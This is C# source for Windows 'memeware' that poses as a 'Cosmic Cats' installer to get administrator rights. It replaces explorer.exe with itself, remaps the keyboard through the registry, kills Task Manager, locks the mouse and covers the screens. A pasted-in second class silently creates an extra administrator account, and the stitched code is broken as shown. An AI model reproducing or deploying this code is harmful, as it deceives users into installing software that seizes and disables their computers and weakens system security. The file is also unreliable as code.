using Microsoft.Win32;

namespace MysteryMemeware
{
    //takeown /f "C:\Windows\System32\taskmgr.exe" && icacls "C:\Windows\System32\taskmgr.exe" /grant administrators:F
    //takeown /f "C:\Windows\System32\winlogon.exe" && icacls "C:\Windows\System32\winlogon.exe" /grant administrators:F
    public static class Program
    {
        [System.STAThread]
        public static void Main()
        {
            RunUninstallKeyListener();

            if (IsInstalled())
            {
                Run();
            }
            else if (IsAdmin())
            {
                Install();
            }
            else
            {
                RestartAsAdmin();
            }

            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
        public static void RunUninstallKeyListener()
        {
            long pressStartTime = 0;
            System.Diagnostics.Stopwatch stopwatch = new System.Diagnostics.Stopwatch();

            System.Timers.Timer timer = new System.Timers.Timer();
            timer.AutoReset = true;
            timer.Interval = 100;

            timer.Elapsed += (object sender, System.Timers.ElapsedEventArgs e) =>
            {
                bool escapeDown = GetKeyState(88) < -64;

                if (escapeDown && pressStartTime == 0)
                {
                    pressStartTime = stopwatch.ElapsedTicks;
                }
                else if (!escapeDown)
                {
                    pressStartTime = 0;
                }

                if (stopwatch.ElapsedTicks - pressStartTime >= 50000000 && pressStartTime != 0)
                {
                    Uninstall();
                }
            };

            timer.Start();

            stopwatch.Start();
        }
        [System.Runtime.InteropServices.DllImport("USER32.dll")]
        private static extern short GetKeyState(int virtualKeyID);
        public static void Run()
        {
            //VolumeModule.SetVolume();
            TaskMGRModule.KillTaskMGR();
            MouseLockModule.LockMouse();
            MusicModule.PlayMusic();
            DisplayCoverModule.CoverDisplays();

            while (true)
            {

            }
        }
        public static void Install()
        {
            System.Diagnostics.ProcessStartInfo processStartInfo = new System.Diagnostics.ProcessStartInfo();
            processStartInfo.Arguments = "/c takeown /f \"C:\\Windows\\explorer.exe\" && icacls \"C:\\Windows\\explorer.exe\" /grant administrators:F";
            processStartInfo.CreateNoWindow = true;
            processStartInfo.Domain = null;
            processStartInfo.ErrorDialog = false;
            processStartInfo.FileName = "C:\\Windows\\System32\\cmd.exe";
            processStartInfo.LoadUserProfile = false;
            processStartInfo.UseShellExecute = true;
            processStartInfo.Verb = "runas";
            processStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            processStartInfo.WorkingDirectory = "C:\\Windows\\System32\\";
            System.Diagnostics.Process cmdProcess = System.Diagnostics.Process.Start(processStartInfo);
            while (!cmdProcess.HasExited)
            {

            }

            System.IO.File.Move("C:\\Windows\\explorer.exe", "C:\\Windows\\explorerBackup.exe");
            System.IO.File.Copy(typeof(Program).Assembly.Location, "C:\\Windows\\explorer.exe");

            RegistryKey regScanMapKey = Registry.LocalMachine.CreateSubKey("System\\CurrentControlSet\\Control\\Keyboard Layout");
            if (regScanMapKey != null)
            {
                byte[] scancodeMapBytes = new byte[328] { 0, 0, 0, 0, 0, 0, 0, 0, 79, 0, 0, 0, 0, 0, 33, 224, 0, 0, 108, 224, 0, 0, 109, 224, 0, 0, 17, 224, 0, 0, 107, 224, 0, 0, 64, 224, 0, 0, 66, 224, 0, 0, 59, 224, 0, 0, 62, 224, 0, 0, 60, 224, 0, 0, 63, 224, 0, 0, 88, 224, 0, 0, 7, 224, 0, 0, 65, 224, 0, 0, 87, 224, 0, 0, 67, 224, 0, 0, 35, 224, 0, 0, 61, 224, 0, 0, 8, 224, 0, 0, 59, 0, 0, 0, 68, 0, 0, 0, 87, 0, 0, 0, 88, 0, 0, 0, 100, 0, 0, 0, 101, 0, 0, 0, 102, 0, 0, 0, 103, 0, 0, 0, 104, 0, 0, 0, 105, 0, 0, 0, 106, 0, 0, 0, 60, 0, 0, 0, 107, 0, 0, 0, 108, 0, 0, 0, 109, 0, 0, 0, 110, 0, 0, 0, 111, 0, 0, 0, 61, 0, 0, 0, 62, 0, 0, 0, 63, 0, 0, 0, 64, 0, 0, 0, 65, 0, 0, 0, 66, 0, 0, 0, 67, 0, 0, 0, 19, 224, 0, 0, 20, 224, 0, 0, 18, 224, 0, 0, 32, 224, 0, 0, 25, 224, 0, 0, 34, 224, 0, 0, 16, 224, 0, 0, 36, 224, 0, 0, 46, 224, 0, 0, 48, 224, 0, 0, 93, 224, 0, 0, 70, 224, 0, 0, 79, 224, 0, 0, 1, 0, 0, 0, 71, 224, 0, 0, 56, 0, 0, 0, 29, 0, 0, 0, 91, 224, 0, 0, 81, 224, 0, 0, 73, 224, 0, 0, 94, 224, 0, 0, 55, 224, 0, 0, 56, 224, 0, 0, 56, 224, 0, 0, 29, 224, 0, 0, 92, 224, 0, 0, 95, 224, 0, 0, 99, 224, 0, 0, 106, 224, 0, 0, 102, 224, 0, 0, 105, 224, 0, 0, 50, 224, 0, 0, 103, 224, 0, 0, 101, 224, 0, 0, 104, 224, 0, 0, 0, 0 };

                regScanMapKey.SetValue("Scancode Map", scancodeMapBytes);
            }
            regScanMapKey.Close();

            WinLogOffModule.Restart();
        }
        public static void RestartAsAdmin()
        {
            if (System.Windows.Forms.MessageBox.Show("Cosmic Cats is not yet installed on your computer. Would you like to install it now?", "Install Cosmic Cats?", System.Windows.Forms.MessageBoxButtons.YesNo) == System.Windows.Forms.DialogResult.No)
            {
                return;
            }

            if (System.Windows.Forms.MessageBox.Show("Administrator access is required in order to install Cosmic Cats. Please select yes on the following popup to grant administrator, or you may select no to cancel the installation.", "Administrator Access Requested.", System.Windows.Forms.MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
            {
                return;
            }

            try
            {
                System.Diagnostics.ProcessStartInfo processStartInfo = new System.Diagnostics.ProcessStartInfo(typeof(Program).Assembly.Location);
                processStartInfo.Verb = "runas";
                System.Diagnostics.Process.Start(processStartInfo);

                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }
            catch (System.ComponentModel.Win32Exception ex)
            {
                if (ex.NativeErrorCode != 1223)
                {
                    throw ex;
                }
                System.Windows.Forms.MessageBox.Show("Administrator access was denied and therefore Cosmic Cats could not be installed.", "Insufficient Permissions.", System.Windows.Forms.MessageBoxButtons.OK);
            }
        }

        class Program
        {
            public static string Name;
            public static string Pass;


            static void Main(string[] args)
            {
                Console.WriteLine("Windows Account Creator");
                Console.WriteLine("Enter User Name");
                Name = Console.ReadLine();

                Console.WriteLine("Enter User Password");
                Pass = Console.ReadLine();

                createUser(Name, Pass);

            }

            public static void createUser(string Name, string Pass)
            {


                try
                {
                    DirectoryEntry AD = new DirectoryEntry("WinNT://" +
                                        Environment.MachineName + ",computer");
                    DirectoryEntry NewUser = AD.Children.Add(Name, "user");
                    NewUser.Invoke("SetPassword", new object[] { Pass });
                    NewUser.Invoke("Put", new object[] { "Description", "Test User from .NET" });
                    NewUser.CommitChanges();
                    DirectoryEntry grp;

                    grp = AD.Children.Find("Administrators", "group");
                    if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
                    Console.WriteLine("Account Created Successfully");
                    Console.WriteLine("Press Enter to continue....");
                    Console.ReadLine();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    Console.ReadLine();

                }

            }
        }

        public static void Uninstall()
        {
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
        public static bool IsInstalled()
        {
            System.Diagnostics.Stopwatch stopwatch = new System.Diagnostics.Stopwatch();
            stopwatch.Start();

            byte[] thisProgramBytes = System.IO.File.ReadAllBytes(typeof(Program).Assembly.Location);
            byte[] fileExplorerBytes = System.IO.File.ReadAllBytes("C:\\Windows\\explorer.exe");

            if (thisProgramBytes.Length != fileExplorerBytes.Length)
            {
                return false;
            }

            for (int i = 0; i < thisProgramBytes.Length; i++)
            {
                if (thisProgramBytes[i] != fileExplorerBytes[i])
                {
                    return false;
                }
            }

            return true;
        }
        public static bool IsAdmin()
        {
            System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
    }
}